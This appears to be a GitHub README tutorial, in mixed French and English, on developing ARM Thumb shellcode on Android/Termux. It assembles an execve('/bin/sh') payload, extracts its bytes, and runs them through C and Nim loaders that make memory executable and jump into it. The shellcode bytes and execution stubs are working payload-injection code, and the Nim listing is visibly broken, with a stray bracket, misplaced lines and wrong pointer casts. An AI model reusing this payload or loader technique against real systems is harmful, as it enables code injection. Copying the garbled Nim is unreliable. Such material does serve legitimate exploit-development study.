# Shellcode développement 
  shellcode injection 
# Environnement
  ` ~ $> uname -a
Linux 2023 armv8l Android `

  `~ $> Device model:
  RMX3231`

  `~ $> Packages CPU architecture:
  arm `

  `termux-tools/stable 1.39.4 `

# requirements
  ` ~ $> nasm --v
NASM version 2.16.01 compiled on Dec 22 2022`

  ` ~ $> nim --v
Nim Compiler Version 2.0.0 [Android: arm]
Compiled at 2023-08-01
Copyright (c) 2006-2023 by Andreas Rumpf`

  `~ $> ld -v
GNU ld (GNU Binutils) 2.41`

  `~ $> as -v
GNU assembler version 2.41 (arm-linux-androideabi) using BFD version (GNU Binutils) 2.41`

  `~ $> clang/stable 17.0.4 arm `

  `~ $> gcc -v
clang version 16.0.6
Target: armv7a-unknown-linux-android24
Thread model: posix `

# file asm
create a file [shell.s](https://github.com/Dkwebpoint/shellcode/blob/d8a27ade633d2060e7ea94e51a31313262a34ec3/Shell.s)

```
GNU nano 7.2             shell.s
.global _start
.text

_start:
       .code 32
        add r3, pc, #1
        bx  r3

        .code 16
        add r0, pc, #8
        eor r1, r1, r1
        eor r2, r2, r2
        strb r2, [r0, #7]
        mov r7, #11
        svc #1

.ascii "/bin/shX"
```

# Compile and execute:

```
~ $> as shell.s -o shell.o
~ $> ld --help
--- snip --
-N, --omagic        Do not page align data, do not make text readonly.
~ $> ld -N shell.o -o shell
```
![ Use ld -N ](https://github.com/Dkwebpoint/shellcode/blob/be42d7cafd5f195efc91ec5d1cd4022ccbb6128e/IMG_20231109_055637.jpg)
# Extract the shellcode
```
~ $> objcopy -O binary shell shell.bin
~ $> hexdump -v -e '"\\""x" 1/1 "%02x" ""' shell.bin               $>\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x58
```
![extrct the shellcode](https://github.com/Dkwebpoint/shellcode/blob/702defc0e20912539f6ecb994810f9c96dc78e65/IMG_20231109_143924.jpg)

# Shellcode tester 

create a file [ShellTester.c](https://github.com/Dkwebpoint/shellcode/blob/36c5cbee6fddb6f48329b393e88a74c329c25c82/ShellTester.c)

```
GNU nano 7.2                                                 shelltester.c
/**********************************************************************
*
* Program: shelltester.c
*
* Date: 08/11/2023
*
* Purpose: This code is used to provide a C template to paste shellcode
*          into and be able to run it live from within an ELF binary's
*          char buffer. This allows you to create a buffer with the
*          shellcode globally and this program will mark it as RWX using
*          mprotect() and then finally jump into.
*
* gcc -m32 -z execstack shelltester.c -o shellcodetester
*
***********************************************************************/
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>

/////////////////////////////////////////////////////
//  source file: shell.s
/////////////////////////////////////////////////////                                                                                        char payload[] = "\x01\x30\x8f\xe2"
                 "\x13\xff\x2f\xe1"
                 "\x02\xa0"
                 "\x49\x40"                                                                                                                                   "\x52\x40"
                 "\xc2\x71"
                 "\x0b\x27"
                 "\x01\xdf"
                 "\x2f\x62\x69\x6e"
                 "\x2f\x73\x68\x58";

int main() {
    // Print the banner.
    puts("\n\t\033[33;1m---===[ Shellcode Tester Stub v1.0 ]===---\033[0m\n");

    // Print the size of the shellcode.                                                                                                          printf(" [\033[34;1m*\033[0m] Shellcode Size:  %d\n", sizeof(payload)-1);

    // Create a function pointer to the shellcode and
    // display it to the user.
    void (*shell)();
        shell=(void (*)())payload;

    printf(" [\033[34;1m*\033[0m] Shellcode Address: %p\n", shell);

    // Calculate the address to the start of the page for the
    // the shellcode.
    void *page_offset = (void *)((int)shell & ~(getpagesize()-1));
    printf(" [\033[34;1m*\033[0m] Shellcode page: %p\n", &page_offset);

    // Use mprotect to mark that page as RWX.
    mprotect(page_offset, 4096, PROT_READ|PROT_WRITE|PROT_EXEC);

    // Finally, use our function pointer to jump into our payload.
    puts("\n\033[33;1m---------[ Begin Shellcode Execution ]---------\033[0m");
    (*shell)();

    // We likely won't get here, but might as well include it just in case.
    puts("\033[33;1m---------[  End Shellcode Execution  ]---------\033[0m");
    return 0;
}
```
# Compile and execute the shellcode with C programme 

```
~ $> gcc -o shelltester -z execstack ShellTester.c

~ $> ./shelltester

```
![execute](https://github.com/Dkwebpoint/shellcode/blob/ec30f234b6aabeda21106e148769ef09001e2b85/IMG_20231112_084450.jpg)

# Compile and execute the shellcode with NIM programme 

create a file [shelltester.nim]()
```
GNU nano 7.2                           test7.nim
import std/[posix, strformat]
import std/strutils

var
  payload = array[28, byte] [
  byte 0x01,0x30,0x8f,0xe2,0x13,0xff,0x2f,0xe1,0x02,0xa0,0x49,0x40,0x52,0x40,0xc2,0x71,0x0b,0x27,0x01,0xdf,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x58
  ]
  ]

  (prot, flag) = (PROT_WRITE or PROT_EXEC, MAP_ANONYMOUS or MAP_PRIVATE)
  tstptr = mmap(nil, sizeof payload, prot, flag, -1, 0)
  tstptr2: pointer
  memad: int

if tstptr != nil:
  echo "Mémoire allouée avec succès a :",tstptr.repr
else:
  echo "Erreur lors de l'allocation de mémoire"                                         copyMem(tstptr, payload[0].addr, sizeof payload)
cast[proc(){.cdecl.}](tstptr)()
echo payload.repr                                                                       echo tstptr.repr # prints hello, world!
echo typeof(tstptr)

memad = cast[int](tstptr) # address, same as the one listed in repr(tstptr)!
tstptr2 = cast[pointer](memad) # generic pointer to address?
tstptr = cast[ptr string](tstptr2) # converting back to pointer to string?
echo tstptr2.repr

echo typeof(tstptr2)
if tstptr != nil:
  echo "Mémoire allouée avec succès a :",tstptr.repr
else:
  echo "Erreur lors de l'allocation de mémoire"

discard munmap(tstptr, sizeof payload)
```
```
~ $> nim compile shelltester.nim
~ $> ./shelltester
```

[nim shelltester programme ]()
